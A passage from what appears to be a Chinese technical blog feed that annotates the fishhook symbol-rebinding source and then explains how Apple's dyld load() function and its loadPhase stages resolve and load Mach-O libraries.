class="line">  <span class="comment">// 0x0000398	  0x0000000000003000	  VM Size			  12288</span></span><br><span class="line">  <span class="comment">// 0x00003A0    0x0000000000002000	  File Offset		  8192</span></span><br><span class="line">  <span class="comment">// 0x00003A8    0x0000000000002690	  File Size			  9872</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// base = 100002000-2000 + slide = 0x0000000100000000 + slide</span></span><br><span class="line">  <span class="comment">// 这应该是一个公式</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> linkedit_base = (<span class="keyword">uintptr_t</span>)slide + linkedit_segment-&gt;vmaddr - linkedit_segment-&gt;fileoff;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 符号表的地址 = 基址 + 符号表偏移量</span></span><br><span class="line">  <span class="keyword">nlist_t</span> *symtab = (<span class="keyword">nlist_t</span> *)(linkedit_base + symtab_cmd-&gt;symoff);</span><br><span class="line">  <span class="comment">// 字符串表的地址 = 基址 + 字符串表偏移量</span></span><br><span class="line">  <span class="keyword">char</span> *strtab = (<span class="keyword">char</span> *)(linkedit_base + symtab_cmd-&gt;stroff);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get indirect symbol table (array of uint32_t indices into symbol table)</span></span><br><span class="line">  <span class="comment">// 动态符号表地址 = 基址 + 动态符号表偏移量</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symtab = (<span class="keyword">uint32_t</span> *)(linkedit_base + dysymtab_cmd-&gt;indirectsymoff);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//再一次遍历loadcommands</span></span><br><span class="line">  cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">          <span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA_CONST) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="comment">//找到__DATA和__DATA_CONST的section</span></span><br><span class="line">	  <span class="comment">//__DATA section里面保存的是符号跳转的函数指针表</span></span><br><span class="line">	  <span class="comment">// 对__nl_symbol_ptr以及__la_symbol_ptr进行rebind</span></span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur_seg_cmd-&gt;nsects; j++) &#123;</span><br><span class="line">        <span class="keyword">section_t</span> *sect =</span><br><span class="line">          (<span class="keyword">section_t</span> *)(cur + <span class="keyword">sizeof</span>(<span class="keyword">segment_command_t</span>)) + j;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _rebind_symbols_for_image(<span class="keyword">const</span> <span class="keyword">struct</span> mach_header *header,</span><br><span class="line">                                      <span class="keyword">intptr_t</span> slide) &#123;</span><br><span class="line">    rebind_symbols_for_image(_rebindings_head, header, slide);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols_image</span><span class="params">(<span class="keyword">void</span> *header,</span><br><span class="line">                         intptr_t slide,</span><br><span class="line">                         <span class="keyword">struct</span> rebinding rebindings[],</span><br><span class="line">                         size_t rebindings_nel)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> rebindings_entry *rebindings_head = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> retval = prepend_rebindings(&amp;rebindings_head, rebindings, rebindings_nel);</span><br><span class="line">    rebind_symbols_for_image(rebindings_head, header, slide);</span><br><span class="line">    <span class="built_in">free</span>(rebindings_head);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols</span><span class="params">(<span class="keyword">struct</span> rebinding rebindings[], size_t rebindings_nel)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> retval = prepend_rebindings(&amp;_rebindings_head, rebindings, rebindings_nel);</span><br><span class="line">  <span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// If this was the first call, register callback for image additions (which is also invoked for</span></span><br><span class="line">  <span class="comment">// existing images, otherwise, just run on existing images</span></span><br><span class="line">  <span class="keyword">if</span> (!_rebindings_head-&gt;next) &#123;</span><br><span class="line">    _dyld_register_func_for_add_image(_rebind_symbols_for_image);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> c = _dyld_image_count();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; c; i++) &#123;</span><br><span class="line">      _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="小结">小结</h1><p>整个流程中最复杂的部分是<code>perform_rebinding_with_section</code>实现的功能。</p>
<p>简单的概括流程：</p>
<ul>
<li>通过<code>__la_symbol_ptr</code>的<code>reserved1</code>字段找到第一个需要动态绑定的符号在动态符号表中的位置。</li>
</ul>
<ul>
<li>通过<code>__la_symbol_ptr</code>中提供的数据找到在<code>symbol table</code>中的数据。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/__la_symbol_ptr.png" alt="图1"></p>
<p>图上可以看到<code>reserved1</code>被machoview工具修改成了<code>Indirect Sym Index</code>,他的值是3.</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/indirect symbols.png" alt="图2"></p>
<p>可以看到<strong>第四个</strong>就是需要延时绑定的符号开始的地方。上面的值是<strong>3</strong>。</p>
<p>因为<strong>0，1，2，3….</strong></p>
<p>所以找到了他在符号表中的<strong>偏移量</strong>。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/symbol%20table.png" alt="图3"></p>
<p>后面的逻辑就比较好理解了，找到目标函数，替换目标函数。</p>
<h1 id="PS">PS</h1><p>从<code>github</code>可以获取注释后的代码。</p>
<p><a href="https://github.com/turingH/fishhook_analysis" target="_blank" rel="external">https://github.com/turingH/fishhook_analysis</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>没什么特别要说的，详细看代码，可以结合之前的两篇文章，更好的理解这部分内容。</p>
<p><a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-o格式分析</a></p>
<p><a href="http://BLOGIMAGE/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/">mach-o延时绑定</a><br>]]>
    
    </summary>
    
      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
    
      <category term="hook" scheme="http://turingh.github.io/tags/hook/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[dyld源码分析-动态加载load]]></title>
    <link href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/"/>
    <id>http://turingh.github.io/2016/03/16/dyld源码分析load/</id>
    <published>2016-03-16T19:13:52.000Z</published>
    <updated>2016-03-24T03:35:50.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在<code>OS X</code>或者<code>IOS</code>上运行一个程序时，dyld除了需要加载主要的执行程序之外，还需要加载需要的库文件以及库文件依赖的库文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// instantiate ImageLoader for main executable</span></span><br><span class="line">sMainExecutable = instantiateFromLoadedImage(mainExecutableMH, mainExecutableSlide, sExecPath);<span class="comment">//加载MACHO到image</span></span><br></pre></td></tr></table></figure>
<p>这一条函数调用加载了需要运行的程序，具体详细分析可以参考<a href="http://BLOGIMAGE/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">dyld中mach-o文件加载的简单分析</a>。</p>
<p>而在<code>link</code>主程序之前还会动态的加载一些其他的库文件。例如<code>DYLD_INSERT_LIBRARIES</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// load any inserted libraries</span></span><br><span class="line"><span class="comment">// 类似于linux里面的LD_PRELOAD</span></span><br><span class="line"><span class="keyword">if</span>	( sEnv.DYLD_INSERT_LIBRARIES != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* lib = sEnv.DYLD_INSERT_LIBRARIES; *lib != <span class="literal">NULL</span>; ++lib) </span><br><span class="line">		loadInsertedDylib(*lib); <span class="comment">//!!!动态加载dylib</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// record count of inserted libraries so that a flat search will look at </span></span><br><span class="line"><span class="comment">// inserted libraries, then main, then others.</span></span><br><span class="line">sInsertedDylibCount = sAllImages.size()-<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p><code>loadInsertedDylib</code>的实现其实就是简单的调用<code>load</code>函数。通过简单的分析<code>load</code>函数，增强对dyld工作流程的理解。</p>
<a id="more"></a>
<h1 id="0x01_为什么要分析Load函数">0x01 为什么要分析Load函数</h1><p>通过一个简单的图，可以看到<code>Load</code>函数的调用者都是哪些函数。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/CalledBy-load.png" alt="load调用"></p>
<p>除了前面提到的<code>loadInsertedDylib</code>函数之外接触的比较多的就是<code>dlopen</code>了，所以，可以看出<code>load</code>是<code>dyld</code>动态加载一个<code>Mach-O</code>文件的重要接口。在动态加载一个<code>Mach</code>-o文件的时候，最终都调用了<code>load</code>这个API。</p>
<h1 id="0x02_Load函数分析">0x02 Load函数分析</h1><p><code>Load</code>函数的实现为一系列的<code>loadPhase*</code>函数，主要可以分为这几个部分</p>
<ul>
<li>处理环境变量，生成各种搜索路径。</li>
<li>如果该<code>lib</code><strong>已经</strong>加载过，则利用<code>share_cache</code>中已经存在的<code>imageloader</code>实例。</li>
<li>如果该<code>lib</code>没有加载过，通过读取文件，将mach-o文件映射到内存中，生成<code>imageloader</code>的实例。</li>
</ul>
<h2 id="2-1_load">2.1 load</h2><p>通过一幅图可以简单的理解<code>load</code>函数的流程。<code>load</code>函数主要做的这几件事情：</p>
<ul>
<li><p>处理suffix字段。</p>
</li>
<li><p>通过<code>loadPhase0</code>函数从<code>share_cache</code>中加载<code>image</code>。</p>
</li>
<li><p>如果<code>share_cache</code>中<strong>不存在</strong><code>image</code>，则再使用<strong>不同的参数</strong>调用<code>loadPhase0</code>函数，通过<code>open</code>函数读取文件并加载<code>image</code>到内存中。</p>
</li>
<li><p>函数调用结束后的内存管理。</p>
<p>​</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/load.png" alt="load"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据所有的环境变量生成路径，去加载一个ImageLoader</span></span><br><span class="line"><span class="function">ImageLoader* <span class="title">load</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LoadContext&amp; context)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	CRSetCrashLogMessage2(path);</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* orgPath = path;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s)\n", __func__ , path);</span></span><br><span class="line">	<span class="keyword">char</span> realPath[PATH_MAX];</span><br><span class="line">	<span class="comment">// when DYLD_IMAGE_SUFFIX is in used, do a realpath(), otherwise a load of "Foo.framework/Foo" will not match</span></span><br><span class="line">	<span class="comment">// 当设置了DYLD_IMAGE_SUFFIX字段，需要使用realpath来加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.useSearchPaths &amp;&amp; ( gLinkContext.imageSuffix != <span class="literal">NULL</span>) ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( realpath(path, realPath) != <span class="literal">NULL</span> )</span><br><span class="line">			path = realPath;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try all path permutations and check against existing loaded images</span></span><br><span class="line">	<span class="comment">// 尝试各种路径组合去加载image</span></span><br><span class="line">	ImageLoader* image = loadPhase0(path, orgPath, context, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">		CRSetCrashLogMessage2(<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// try all path permutations and try open() until first success</span></span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt; exceptions;</span><br><span class="line">	image = loadPhase0(path, orgPath, context, &amp;exceptions);</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">    CRSetCrashLogMessage2(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">		<span class="comment">/* 加载成功内存处理*/</span></span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ( exceptions.size() == <span class="number">0</span> ) &#123;</span><br><span class="line">		<span class="comment">/* 出错处理 */</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* 出错处理 */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2_loadPhase0函数">2.2 loadPhase0函数</h2><p><code>loadPhase0</code>函数逻辑比较简单</p>
<ul>
<li>遍历<code>DYLD_ROOT_PATH</code>环境变量，生成加载路径，调用<code>loadPhase1</code>。</li>
<li>如果不存在<code>DYLD_ROOT_PATH</code>环境变量，则使用原始的路径</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// try root substitutions</span></span><br><span class="line"><span class="comment">// 主要处理DYLD_ROOT_PATH环境变量的功能，修饰Loadimage时候的path</span></span><br><span class="line"><span class="comment">// 运行完结之后执行loadPhase1</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase0</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// handle DYLD_ROOT_PATH which forces absolute paths to use a new root</span></span><br><span class="line">	<span class="keyword">if</span> ( (gLinkContext.rootPaths != <span class="literal">NULL</span>) &amp;&amp; (path[<span class="number">0</span>] == <span class="string">'/'</span>) ) &#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* rootPath = gLinkContext.rootPaths ; *rootPath != <span class="literal">NULL</span>; ++rootPath) &#123;</span><br><span class="line">			<span class="keyword">char</span> newPath[<span class="built_in">strlen</span>(*rootPath) + <span class="built_in">strlen</span>(path)+<span class="number">2</span>];</span><br><span class="line">			<span class="built_in">strcpy</span>(newPath, *rootPath);</span><br><span class="line">			<span class="built_in">strcat</span>(newPath, path);</span><br><span class="line">			ImageLoader* image = loadPhase1(newloadPhase1Path, orgPath, context, exceptions);</span><br><span class="line">			<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">				<span class="keyword">return</span> image;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// try raw path</span></span><br><span class="line">	<span class="keyword">return</span> loadPhase1(path, orgPath, context, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-3_loadPhase1">2.3 loadPhase1</h2><p><code>loadPhase</code>主要处理内容：</p>
<ul>
<li>通过<code>LD_LIBRARY_PATH</code>参数组成的所有路径，通过<code>loadPhase2</code>尝试加载<code>image</code>。</li>
<li>当无法通过<code>LD_LIBRARY_PATH</code>获取<code>image</code>时，则通过<code>DYLD_FRAMEWORK_PATH</code>与<code>DYLD_LIBRARY_PATH</code>组成的路径，通过<code>loadPhase2</code>尝试加载<code>image</code>。</li>
<li>如果上面两个流程都无法加载到image则通过原始路径通过<code>loadPhase3</code>尝试加载<code>image</code>。</li>
<li>如果依然无法加载到image则通过<code>DYLD_FALLBACK_FRAMEWORK_PATH</code>环境变量，组成路径最后尝试加载<code>image</code>。</li>
</ul>
<p>这里要<strong>注意一下</strong>，因为不同的分支使用的<code>Phase</code>函数有可能是不同的。同时该函数也确定了环境变量在动态加载时的优先级。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	ImageLoader* image = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// handle LD_LIBRARY_PATH environment variables that force searching</span></span><br><span class="line">	<span class="comment">// 如果存在LD_LIBRARY_PATH变量，优先通过LD_LIBRARY_PATH中设置的路径进行搜索和加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.useLdLibraryPath &amp;&amp; (sEnv.LD_LIBRARY_PATH != <span class="literal">NULL</span>) ) &#123;</span><br><span class="line">		image = loadPhase2(path, orgPath, context, <span class="literal">NULL</span>, sEnv.LD_LIBRARY_PATH, exceptions);</span><br><span class="line">		<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">			<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// handle DYLD_ environment variables that force searching</span></span><br><span class="line">	<span class="comment">// 如果使用了DYLD_FRAMEWORK_PATH或者sEnv.DYLD_LIBRARY_PATH，则使用这两个环境变量去加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.useSearchPaths &amp;&amp; ((sEnv.DYLD_FRAMEWORK_PATH != <span class="literal">NULL</span>) || (sEnv.DYLD_LIBRARY_PATH != <span class="literal">NULL</span>)) ) &#123;</span><br><span class="line">		image = loadPhase2(path, orgPath, context, sEnv.DYLD_FRAMEWORK_PATH, sEnv.DYLD_LIBRARY_PATH, exceptions);</span><br><span class="line">		<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">			<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try raw path</span></span><br><span class="line">	<span class="comment">// 如果上面的环境变量都没有设置，就使用原始地址去加载</span></span><br><span class="line">	<span class="comment">// 函数是loadphase3</span></span><br><span class="line">	image = loadPhase3(path, orgPath, context, exceptions);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try fallback paths during second time (will open file)</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* fallbackLibraryPaths = sEnv.DYLD_FALLBACK_LIBRARY_PATH;</span><br><span class="line">	<span class="keyword">if</span> ( (fallbackLibraryPaths != <span class="literal">NULL</span>) &amp;&amp; !context.useFallbackPaths )</span><br><span class="line">		fallbackLibraryPaths = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> ( !context.dontLoad  &amp;&amp; (exceptions != <span class="literal">NULL</span>) &amp;&amp; ((sEnv.DYLD_FALLBACK_FRAMEWORK_PATH != <span class="literal">NULL</span>) || (fallbackLibraryPaths != <span class="literal">NULL</span>)) ) &#123;</span><br><span class="line">		image = loadPhase2(path, orgPath, context, sEnv.DYLD_FALLBACK_FRAMEWORK_PATH, fallbackLibraryPaths, exceptions);</span><br><span class="line">		<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">			<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-4_loadPhase2,loadPhase3，loadPhase4">2.4 loadPhase2,loadPhase3，loadPhase4</h2><p>这两个函数纯粹的实现了路径修改的逻辑，通过不同的方式去生成最终的加载路径，逻辑与<code>loadPhase0</code>基本类似，有兴趣可以自行查看代码。</p>
<p><a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2933" target="_blank" rel="external">LoadPhase2</a></p>
<p><a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2820" target="_blank" rel="external">LoadPhase3</a></p>
<p><a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2797" target="_blank" rel="external">LoadPhase4</a></p>
<h2 id="2-5_loadPhase5">2.5 loadPhase5</h2><p><code>loadPhase5</code>根据参数<code>exceptions</code>的不同形成了两个不同的分支。</p>
<ul>
<li>loadPhase5load：通过读取文件，加载文件到内存中，实例化<code>ImageLoader</code>。</li>
<li>loadPhase5check: 通过遍历已经加载的<code>ImageLoader</code>的容器，获取已经加载的<code>ImageLoader</code>。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// open or check existing</span></span><br><span class="line"><span class="comment">// 检测是否有覆盖的，修正path，最后调用loadPhase5Load或者check</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase5</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// check for specific dylib overrides</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;DylibOverride&gt;::iterator it = sDylibOverrides.begin(); it != sDylibOverrides.end(); ++it) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="built_in">strcmp</span>(it-&gt;installName, path) == <span class="number">0</span> ) &#123;</span><br><span class="line">			path = it-&gt;override;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( exceptions != <span class="literal">NULL</span> ) </span><br><span class="line">		<span class="keyword">return</span> loadPhase5load(path, orgPath, context, exceptions);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> loadPhase5check(path, orgPath, context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>loadPhase5check</code>的逻辑非常简单，就是遍历容器，取出相同名字的imageLoader对象。有兴趣的可以自己查看<a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2729" target="_blank" rel="external">loadPhase5check</a>。</p>
<h2 id="2-6_loadPhase5load">2.6 loadPhase5load</h2><p>这里是真正的加载逻辑</p>
<ul>
<li>防止Image改名，在Image的容器里面遍历，检查是否已经加载</li>
<li>在<code>SharedCache</code>寻找是否存在Image的缓存，如果存在的使用<code>ImageLoaderMachO::instantiateFromCache</code>来实例化<code>ImageLoader</code>。</li>
<li>如果上面两个都没有找到的话，就通过<code>loadPhase5open</code>打开文件，并读取到内存。</li>
</ul>
